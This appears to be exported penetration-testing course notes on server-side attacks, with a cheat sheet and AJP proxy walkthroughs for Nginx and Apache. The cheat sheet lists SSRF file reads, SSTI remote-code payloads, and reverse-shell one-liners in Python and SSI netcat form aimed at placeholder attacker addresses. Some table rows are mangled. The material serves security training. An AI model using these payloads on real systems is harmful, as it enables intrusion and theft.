
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">

<h1 id="12-server-side-attacks">12. Server-side Attacks</h1>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<h3 id="nginx-reverse-proxy-ajp">Nginx Reverse Proxy &amp; AJP</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>wget https://nginx.org/download/nginx-1.21.3.tar.gz</code></td>
<td>Downloading nginx</td>
</tr>
<tr>
<td><code>tar -xzvf nginx-1.21.3.tar.gz</code></td>
<td>Extracting nginx tar file</td>
</tr>
<tr>
<td><code>git clone https://github.com/dvershinin/nginx_ajp_module.git</code></td>
<td>Cloning nginx_ajp source code</td>
</tr>
<tr>
<td><code>cd nginx-1.21.3</code></td>
<td>Navigating to nginx directory</td>
</tr>
<tr>
<td><code>./configure --add-module=$(pwd)/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules</code></td>
<td>Setting up the configuration for building and installing Nginx web server</td>
</tr>
<tr>
<td><code>make</code></td>
<td>GNU make utility to maintain groups of programs</td>
</tr>
<tr>
<td><code>sudo make install</code></td>
<td>Instructing the make command to execute the installation target defined in the make file</td>
</tr>
<tr>
<td><code>sudo nginx</code></td>
<td>Starting the nginx server</td>
</tr>
</tbody>
</table>
<h3 id="ssrf-exploitation-example">SSRF Exploitation Example</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nmap -sT -T5 --min-rate=10000 -p- 10.129.201.238</code></td>
<td>Scanning the ports of the external target</td>
</tr>
<tr>
<td><code>curl -i -s -L http://&lt;TARGET IP&gt;</code></td>
<td>Interacting with the target and following redirects</td>
</tr>
<tr>
<td><code>nc -lvnp 8080</code></td>
<td>Starting a netcat listener to test for SSRF</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:8080&quot;</code></td>
<td>Testing for SSRF vulnerability</td>
</tr>
<tr>
<td><code>python3 -m http.server 9090</code></td>
<td>Starting the python web server</td>
</tr>
<tr>
<td><code>sudo pip3 install twisted</code></td>
<td>Installing the ftp server</td>
</tr>
<tr>
<td><code>sudo python3 -m twisted ftp -p 21 -r .</code></td>
<td>Starting the ftp server</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:9090/index.html&quot;</code></td>
<td>Retrieving a remote file through the target application (HTTP Schema)</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=file:///etc/passwd&quot;</code></td>
<td>Retrieving a local file through the target application (File Schema)</td>
</tr>
<tr>
<td><code>for port in {1..65535};do echo $port &gt;&gt; ports.txt;done</code></td>
<td>Generating a wordlist of possible ports</td>
</tr>
<tr>
<td><code>ffuf -w ./ports.txt:PORT -u &quot;http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT&quot; -fs 30</code></td>
<td>Fuzzing for ports on the internal interface</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:5000&quot;</code></td>
<td>Interacting with the internal interface on the discovered port</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=index.html&quot;</code></td>
<td>Interacting with the internal application</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http://127.0.0.1:1&quot;</code></td>
<td>Discovering web application listening in on localhost</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1&quot;</code></td>
<td>Modifying the URL to bypass the error message</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///proc/self/environ&quot; -o -</code></td>
<td>Requesting to disclose the /proc/self/environ file on the internal application</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py&quot;</code></td>
<td>Retrieving a local file through the target application</td>
</tr>
<tr>
<td><code>curl -i -s &quot;http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami&quot;</code></td>
<td>Confirming remote code exeuction on the remote host</td>
</tr>
<tr>
<td><code>sudo apt-get install jq</code></td>
<td>Installing jq</td>
</tr>
</tbody>
</table>
<h3 id="blind-ssrf-exploitation-example">Blind SSRF Exploitation Example</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nc -lvnp 9090</code></td>
<td>Starting a netcat listener</td>
</tr>
<tr>
<td>`echo &quot;&quot;&quot;<B64 encoded response>&quot;&quot;&quot; \</td>
<td>base64 -d`</td>
<td>Decoding the base64 encoded response</td>
</tr>
<tr>
<td><code>export RHOST=&quot;&lt;VPN/TUN IP&gt;&quot;;export RPORT=&quot;&lt;PORT&gt;&quot;;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</code></td>
<td>Reverse shell payload (to be URL encoaded twice)</td>
</tr>
</tbody>
</table>
<h3 id="ssi-injection-exploitation-example">SSI Injection Exploitation Example</h3>
<table>
<thead>
<tr>
<th><strong>SSI Directive Payload</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</code></td>
<td>Date</td>
</tr>
<tr>
<td><code>&lt;!--#printenv --&gt;</code></td>
<td>All variables</td>
</tr>
<tr>
<td>`&lt;!--#exec cmd=&quot;mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0&lt;/tmp/foo\</td>
<td>/bin/bash 1&gt;/tmp/foo;rm /tmp/foo&quot; --&gt;`</td>
<td>Reverse Shell</td>
</tr>
</tbody>
</table>
<h3 id="ssti-exploitation-example-1">SSTI Exploitation Example 1</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>git clone https://github.com/epinna/tplmap.git</code></td>
<td>Cloning the tplmap repoistory</td>
</tr>
<tr>
<td><code>cd tplmap</code></td>
<td>Navigating to the new directory</td>
</tr>
<tr>
<td><code>pip install virtualenv</code></td>
<td>Installing the virtual environment with pip</td>
</tr>
<tr>
<td><code>virtualenv -p python2 venv</code></td>
<td>Creating a virtual environment named venv with python2</td>
</tr>
<tr>
<td><code>source venv/bin/activate</code></td>
<td>Activating a Python virtual environment, configuring the shell to use the virtual environment&#39;s Python interpreter</td>
</tr>
<tr>
<td><code>pip install -r requirements.txt</code></td>
<td>Installing dependencies</td>
</tr>
<tr>
<td><code>./tplmap.py -u &#39;http://&lt;TARGET IP&gt;:&lt;PORT&gt;&#39; -d name=john</code></td>
<td>Running tplmap against the target</td>
</tr>
<tr>
<td><code>./tplmap.py -u &#39;http://&lt;TARGET IP&gt;:&lt;PORT&gt;&#39; -d name=john --os-shell</code></td>
<td>Running tplmap with the os-shell option</td>
</tr>
<tr>
<td><code>{{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;id;uname -a;hostname&quot;)}}</code></td>
<td>Twig RCE payload</td>
</tr>
</tbody>
</table>
<h3 id="ssti-exploitation-example-2">SSTI Exploitation Example 2</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>curl -X POST -d &#39;email=${7*7}&#39; http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</code></td>
<td>Interacting with the remote target (Spring payload)</td>
</tr>
<tr>
<td><code>curl -X POST -d &#39;email={{_self.env.display(&quot;TEST&quot;}}&#39; http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</code></td>
<td>Interacting with the remote target (Twig payload)</td>
</tr>
<tr>
<td><code>curl -X POST -d &#39;email={{config.items()}}&#39; http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</code></td>
<td>Interacting with the remote target (Jinja2 basic injection)</td>
</tr>
<tr>
<td><code>curl -X POST -d &#39;email={{ [].class.base.subclasses() }}&#39; http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</code></td>
<td>Interacting with the remote target (Jinja2 dump all classes payload)</td>
</tr>
<tr>
<td>`curl -X POST -d &quot;email=</td>
</tr>
</tbody>
</table>
<p>{{os.system(&#39;whoami&#39;)}}&quot; <a href="http://:/jointheteam`|">http://:/jointheteam`|</a> Interacting with the remote target (Tornado payload) | |<code>./tplmap.py -u &#39;http://:/jointheteam&#39; -d email=blah\</code> | Automating the exploitation process with tplmap |</p>
<h3 id="ssti-exploitation-example-3">SSTI Exploitation Example 3</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>curl -gs &quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*&#39;7&#39;}}&quot;</code></td>
<td>Interacting with the remote target (Confirming Jinja2 backend)</td>
</tr>
<tr>
<td><code>./tplmap.py -u &#39;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd&#39;</code></td>
<td>Automating the templating engine identification process with tplmap</td>
</tr>
<tr>
<td><code>python3</code></td>
<td>Starting the python3 interpreter</td>
</tr>
</tbody>
</table>
<table data-header-hidden><thead><tr><th width="236"></th><th></th></tr></thead><tbody><tr><td><strong>Methods</strong></td><td><strong>Description</strong></td></tr><tr><td><code><strong>class</strong></code></td><td>Returns the object (class) to which the type belongs</td></tr><tr><td><code><strong>mro</strong></code></td><td>Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.</td></tr><tr><td><code><strong>subclasses</strong></code></td><td>Each new class retains references to subclasses, and this method returns a list of references that are still available in the class</td></tr><tr><td><code><strong>builtins</strong></code></td><td>Returns the builtin methods included in a function</td></tr><tr><td><code><strong>globals</strong></code></td><td>A reference to a dictionary that contains global variables for a function</td></tr><tr><td><code><strong>base</strong></code></td><td>Returns the base class inherited by the object</td></tr><tr><td><code><strong>init</strong></code></td><td>Class initialization method</td></tr></tbody></table>

<h2 id="introduction-to-server-side-attacks">Introduction to Server-Side Attacks</h2>
<hr>
<p>Server-Side attacks target the application or service provided by a server, whereas the purpose of a client-side attack is to attack the client. Understanding and identifying the differences is essential for penetration testing and bug bounty hunting.</p>
<p>An excellent example of these that should help clarify the differences between server-side attacks vs. client-side attacks are <code>Cross-Site Request Forgeries (CSRF)</code> and <code>Server-side Request Forgeries (SSRF)</code>. Both of these attacks involve a web server and how servers process URLs. However, CSRF and SSRF have different targets and purposes.</p>
<p>Roughly quoted from the Cross-Site Request Forgery section in the <a href="https://academy.hackthebox.com/course/preview/introduction-to-web-applications">Introduction to Web Applications</a> module:</p>
<p>CSRF attacks may utilize other client side -attacks like XSS vulnerabilities to perform requests to a web application that a victim has already been authenticated to. This allows the attacker to perform actions as the authorized user, such as changing their password to something the attacker would know or performing any unwarranted action as the victim.</p>
<p>From the above situation, we should be able to infer that the target is the client. Server-Side attacks target the actual application, the objective being to leak sensitive data or inject unwarranted input into the application and even achieve remote code execution (RCE). The targets in this situation are the back-end services.</p>
<hr>
<h3 id="types-of-server-side-attacks">Types of Server-Side Attacks</h3>
<p>This module will cover different types of Server-Side attacks and how to exploit them. These are:</p>
<ul>
<li><code>Abusing Intermediary Applications</code>: Accessing internal applications not accessible from our network by leveraging specific exposed binary protocols.</li>
<li><code>Server-Side Request Forgery (SSRF)</code>: Making the hosting application server issue requests to arbitrary external domains or internal resources in an attempt to identify sensitive data.</li>
<li><code>Server-Side Includes Injection (SSI)</code>: Injecting a payload so that ill-intended Server-Side Include directives are parsed to achieve remote code execution or leak sensitive data. This vulnerability occurs when poorly validated user input manages to become part of a response that is parsed for Server-Side Include directives.</li>
<li><code>Edge-Side Includes Injection (ESI)</code>: ESI is an XML-based markup language used to tackle performance issues by temporarily storing dynamic web content that the regular web caching protocols do not save. Edge-Side Include Injection occurs when an attacker manages to reflect ill-intended ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags supplied by an attacker.</li>
<li><code>Server-Side Template Injection (SSTI)</code>: Template Engines facilitate dynamic data presentation through web pages or emails. Server-Side Template Injection is essentially injecting ill-intended template directives (payload) inside a template, leveraging Template Engines that insecurely mix user input with a given template.</li>
<li><code>Extensible Stylesheet Language Transformations Server-Side Injection (XSLT)</code>: XSLT is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformationâ€™s XML document dynamically using unvalidated input from the user.</li>
</ul>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>Let&#39;s now dive into each attack in detail.</p>
<h2 id="ajp-proxy">AJP Proxy</h2>
<hr>
<p>According to Apache, <a href="https://cwiki.apache.org/confluence/display/TOMCAT/Connectors">AJP</a> (or JK) is a wire protocol. It is an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible but proxy the request to Tomcat for Tomcat-related content.</p>
<p>When we come across open AJP proxy ports (<code>8009 TCP</code>) during penetration tests, we may be able to use them to access the &quot;hidden&quot; Apache Tomcat Manager behind it. Although AJP-Proxy is a binary protocol, we can configure our own Nginx or Apache webserver with AJP modules to interact with it and access the underlying application. This way, we can discover administrative panels, applications, and websites that would be otherwise inaccessible.</p>
<p>To see how we can configure our own Nginx or Apache webserver with AJP modules to interact with an open AJP proxy and access the underlying application, jump to the next interactive section.</p>
<p>Note: If you want to replicate such a vulnerable environment on a local machine, you can start an Apache Tomcat Docker exposing only the AJP-Proxy as follows:</p>
<p>First, create a file called <code>tomcat-users.xml</code> including the below.</p>
<p><strong>tomcat-users.xml</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">"manager-gui"</span>/&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">"manager-script"</span>/&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">"tomcat"</span> <span class="hljs-attr">password</span>=<span class="hljs-string">"s3cret"</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">"manager-gui,manager-script"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span>
</code></pre>
<p>After this file is created, install the docker package in your local machine and start the Apache Tomcat Server by issuing the commands below.</p>
<p><strong>Docker Installation</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt install docker<span class="hljs-selector-class">.io</span>
root@htb[/htb]$ sudo docker run -it --rm -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8009</span>:<span class="hljs-number">8009</span> -v `pwd`/tomcat-users<span class="hljs-selector-class">.xml</span>:/usr/local/tomcat/conf/tomcat-users<span class="hljs-selector-class">.xml</span> --name tomcat <span class="hljs-string">"tomcat:8.0"</span>
</code></pre>
<h2 id="nginx-reverse-proxy-ajp">Nginx Reverse Proxy &amp; AJP</h2>
<hr>
<p>When we come across an open AJP proxy port (8009 TCP), we can use Nginx with the <code>ajp_module</code> to access the &quot;hidden&quot; Tomcat Manager. This can be done by compiling the Nginx source code and adding the required module, as follows:</p>
<ul>
<li>Download the Nginx source code</li>
<li>Download the required module</li>
<li>Compile Nginx source code with the <code>ajp_module</code>.</li>
<li>Create a configuration file pointing to the AJP Port</li>
</ul>
<p><strong>Download Nginx Source Code</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ wget https:/</span><span class="hljs-regexp">/nginx.org/</span>download/nginx<span class="hljs-number">-1.21</span><span class="hljs-number">.3</span>.tar.gz
root<span class="hljs-meta">@htb</span>[/htb]$ tar -xzvf nginx<span class="hljs-number">-1.21</span><span class="hljs-number">.3</span>.tar.gz
</code></pre>
<p><strong>Compile Nginx source code with the ajp module</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ git clone https:/</span><span class="hljs-regexp">/github.com/</span>dvershinin/nginx_ajp_module.git
root<span class="hljs-meta">@htb</span>[/htb]$ cd nginx<span class="hljs-number">-1.21</span><span class="hljs-number">.3</span>
root<span class="hljs-meta">@htb</span>[/htb]$ sudo apt install libpcre3-dev
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ./</span>configure --add-module=`pwd`<span class="hljs-regexp">/../</span>nginx_ajp_module --prefix=<span class="hljs-regexp">/etc/</span>nginx --sbin-path=<span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/nginx --modules-path=/</span>usr<span class="hljs-regexp">/lib/</span>nginx/modules
root<span class="hljs-meta">@htb</span>[/htb]$ make
root<span class="hljs-meta">@htb</span>[/htb]$ sudo make install
root<span class="hljs-meta">@htb</span>[/htb]$ nginx -V

nginx <span class="hljs-string">version:</span> nginx/<span class="hljs-number">1.21</span><span class="hljs-number">.3</span>
built by gcc <span class="hljs-number">10.2</span><span class="hljs-number">.1</span> <span class="hljs-number">20210110</span> (Debian <span class="hljs-number">10.2</span><span class="hljs-number">.1</span><span class="hljs-number">-6</span>)
configure <span class="hljs-string">arguments:</span> --add-module=..<span class="hljs-regexp">/nginx_ajp_module --prefix=/</span>etc<span class="hljs-regexp">/nginx --sbin-path=/</span>usr<span class="hljs-regexp">/sbin/</span>nginx --modules-path=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/nginx/</span>modules
</code></pre>
<p>Note: In the following configuration, we are using port 8009, which is Tomcat&#39;s default port for AJP, and this is how we would use it in a real environment. However, to complete the exercise at the end of this section you should specify the IP and port of the target you will spawn (they will both be visible right next to &quot;Target:&quot;). The port you will see is essentially mapped to port 8009 of the underlying Docker container.</p>
<p>Comment out the entire <code>server</code> block and append the following lines inside the <code>http</code> block in <code>/etc/nginx/conf/nginx.conf</code>.</p>
<p><strong>Pointing to the AJP Port</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-attribute">upstream</span> tomcats {
    <span class="hljs-attribute">server</span> &lt;TARGET_SERVER&gt;:<span class="hljs-number">8009</span>;
    <span class="hljs-attribute">keepalive</span> <span class="hljs-number">10</span>;
    }
<span class="hljs-section">server</span> {
    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;
    <span class="hljs-attribute">location</span> / {
        <span class="hljs-attribute">ajp_keep_conn</span> <span class="hljs-literal">on</span>;
        <span class="hljs-attribute">ajp_pass</span> tomcats;
    }
}
</code></pre>
<p>Note: If you are using Pwnbox, then port 80 will be in use already, so, in the above configuration change port 80 to 8080. Finally, in the next step, use port 8080 with cURL.</p>
<p>Start Nginx and check if everything is working correctly by issuing a cURL request to your local host.</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nginx
root@htb[/htb]$ curl http://127.0.0.1:80

<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Apache Tomcat/X.X.XX<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"favicon.ico"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"image/x-icon"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"favicon.ico"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"shortcut icon"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"image/x-icon"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"tomcat.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"wrapper"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"navigation"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"curved container"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-home"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://tomcat.apache.org/"</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-hosts"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/docs/"</span>&gt;</span>Documentation<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-config"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/docs/config/"</span>&gt;</span>Configuration<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-examples"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/examples/"</span>&gt;</span>Examples<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-wiki"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://wiki.apache.org/tomcat/FrontPage"</span>&gt;</span>Wiki<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-lists"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://tomcat.apache.org/lists.html"</span>&gt;</span>Mailing Lists<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-help"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://tomcat.apache.org/findhelp.html"</span>&gt;</span>Find Help<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"separator"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"asf-box"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Apache Tomcat/X.X.XX<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"upper"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"curved container"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"congrats"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"curved container"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>If you're seeing this, you've successfully installed Tomcat. Congratulations!<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
</code></pre>
<h2 id="apache-reverse-proxy-ajp">Apache Reverse Proxy &amp; AJP</h2>
<hr>
<p>Luckily, Apache has the AJP module precompiled for us. We will need to install it, though, as it doesn&#39;t come in default installations. Configuring the AJP-Proxy in our Apache server can be done as follows:</p>
<ul>
<li>Install the libapache2-mod-jk package</li>
<li>Enable the module</li>
<li>Create the configuration file pointing to the target AJP-Proxy port</li>
</ul>
<p>Note: As mentioned in the previous section, port 80 is in use in Pwnbox, and Apache also uses it as its default port. You can change Apache&#39;s default port on &quot;/etc/apache2/ports.conf&quot; to any other port. If you use port 8080, don&#39;t forget to stop nginx beforehand with `sudo nginx -s stop.` In the following configuration, we are using 8009, which is Tomcat&#39;s default port for AJP, and this is how we would use it in a real environment. However, to complete the exercise at the end of the previous section, this time using Apache, you should specify the IP and port of the target you will spawn (they will both be visible right next to &quot;Target:&quot;). The port you will see is essentially mapped to port 8009 of the underlying Docker container.</p>
<p>The required commands and configuration files are the following:</p>
<p>Apache Reverse Proxy &amp; AJP</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo apt install libapache2-mod-jk
root<span class="hljs-meta">@htb</span>[/htb]$ sudo a2enmod proxy_ajp
root<span class="hljs-meta">@htb</span>[/htb]$ sudo a2enmod proxy_http
root<span class="hljs-meta">@htb</span>[/htb]$ <span class="hljs-keyword">export</span> TARGET=<span class="hljs-string">"&lt;TARGET_IP&gt;"</span>
root<span class="hljs-meta">@htb</span>[/htb]$ echo -n <span class="hljs-string">"""&lt;Proxy *&gt;
Order allow,deny
Allow from all
&lt;/Proxy&gt;
ProxyPass / ajp://<span class="hljs-variable">$TARGET</span>:8009/
ProxyPassReverse / ajp://<span class="hljs-variable">$TARGET</span>:8009/"""</span> | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
root<span class="hljs-meta">@htb</span>[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
root<span class="hljs-meta">@htb</span>[/htb]$ sudo systemctl start apache2
</code></pre>
<p>Note: The below cURL command is the one you would normally use, since Apache is listening on port 80 by default. Remember that you had to change port 80 to another one of your choosing. So, to complete the exercise of the previous section, next step would be to specify the port of your choosing while using cURL, &quot;curl <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a>&quot; for example.</p>
<p><strong>Accessing the &quot;hidden&quot; Tomcat page</strong></p>
<p>Apache Reverse Proxy &amp; AJP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl http://127.0.0.1

<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Apache Tomcat/X.X.XX<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
